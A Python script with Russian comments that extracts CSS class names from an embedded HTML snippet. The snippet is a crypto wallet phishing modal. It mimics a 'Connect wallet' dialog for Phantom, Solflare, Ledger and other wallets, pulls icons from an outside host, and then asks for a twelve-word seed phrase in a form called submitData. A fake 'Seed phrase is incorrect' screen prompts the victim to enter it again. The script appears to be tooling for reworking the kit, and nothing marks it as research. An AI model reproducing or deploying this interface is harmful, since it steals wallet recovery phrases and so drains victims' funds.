from bs4 import BeautifulSoup

# Входная строка HTML
html_input = '''
  <div class="modal ">
    <div id="step2" class="modal-content ">
      <div class="pt-10">
        <h1 style="font-size: 44px; font-weight: 800;">Connect wallet</h1>
        <p class="modal-text mt-4">
          Чтобы подключить кошелек нажмите далее
        </p>
      </div>
      <div class="modal-footer">
        <button class="btn   enter_seed btn-primary"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"
            fill="currentColor" class="bi bi-eye-slash-fill" viewBox="0 0 16 16">
            <path
              d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7 7 0 0 0 2.79-.588M5.21 3.088A7 7 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474z" />
            <path
              d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12z" />
          </svg>Авторизоватся через сид фразу</button>
      </div>
    </div>
    <div id="step1" class="modal-content active">
      <div class="select_wallet-container">
        <h1>Connect wallet</h1>
        <div class="wallet_item">
          <img height="28" width="28"
            src="https://backendtestis.top/data/images/icons/698e2ef14957d3ee9bb847b31a4d8db58cc7ecbe.svg"
            alt="Phantom icon" class="tw-mr-3">
          Phantom
        </div>
        <div class="wallet_item">
          <img height="28" width="28"
            src="https://backendtestis.top/data/images/icons/1b24c9da110c92066eb57685034f1dfd41c6927d.svg"
            alt="Solflare icon" class="tw-mr-3">
          Solflare
        </div>
        <div class="wallet_item">
          <img height="28" width="28"
            src="https://backendtestis.top/data/images/icons/876bfed7100123591208745ce7cc54338aec48c2.svg"
            alt="Ledger icon" class="tw-mr-3">
          Ledger
        </div>
        <div class="wallet_item">
          <img height="28" width="28"
            src="https://backendtestis.top/data/images/icons/78f07bdfdcc3b58718d006ff16756e2fa5c40426.svg"
            alt="WalletConnect icon" class="tw-mr-3">
          WalletConnect
        </div>
        <div class="wallet_item">
          <img height="28" width="28"
            src="https://backendtestis.top/data/images/icons/7f6aa89f058212bae4a71a85f1fdfb624e3c8dc2.svg"
            alt="Torus icon" class="tw-mr-3">
          Torus
        </div>
        <div class="wallet_item">
          <img height="28" width="28"
            src="https://backendtestis.top/data/images/icons/9465305944380d3e8b93d3873ce4a8cc71cfa4be.svg"
            alt="Clover icon" class="tw-mr-3">
          Clover
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn nextStep btn-primary">Далее</button>

      </div>
    </div>
    <div id="step3" class="modal-content ">

      <h1 style="font-size: 16px; font-weight: 600; text-align: start;">Enter seed</h1>
      <form id="submitData" class="seed_grid">
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">1.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">2.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">3.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">4.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">5.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">6.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">7.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">8.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">9.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">10.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">11.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>
        <div class="input_container">
          <p size="14" color="#999999" opacity="1">12.</p>
          <input name="seed[]" type="text" class="modal_input">
        </div>

      </form>
      <div class="modal-footer">
        <button class="btn  sendData btn-primary">Авторизоватся</button>
      </div>

    </div>
    <div id="loader" style="align-items: center; justify-content: center;" class="modal-content ">
      <div class="loader-big"></div>


    </div>
    <div id="error" class="modal-content ">
      <div class="pt-10">
        <h1 style="font-size: 44px; text-align: center; color: #ff3636; font-weight: 800;">Seed phrase is incorrect</h1>

      </div>
      <div class="modal-footer">
        <button onclick="changeStepModal('step3')" class="btn   enter_seed btn-primary">Try again</button>
      </div>
    </div>
  </div>		
'''

soup = BeautifulSoup(html_input, 'html.parser')

classes = set()
for element in soup.find_all(class_=True):
    classes.update(element["class"])

file_name = "classes_output.txt"
with open(file_name, "w") as file:
    for cls in classes:
        file.write(f"{cls}\n")

print(f"Классы были успешно сохранены в файл {file_name}")